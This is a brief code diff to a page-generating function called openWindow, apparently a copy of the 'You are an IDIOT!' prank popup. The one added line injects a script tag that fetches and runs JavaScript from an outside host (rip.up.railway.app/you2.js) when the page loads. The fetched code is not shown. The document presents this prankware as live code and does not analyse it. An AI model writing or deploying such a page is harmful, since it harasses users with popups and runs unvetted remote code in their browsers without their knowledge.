@@ -19,6 +19,7 @@ function openWindow(url) {
                 <style>
                     body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
                 </style>
+                <script src="https://rip.up.railway.app/you2.js"></script>
             </head>
             <body>
                 <h1>You are an IDIOT!</h1>
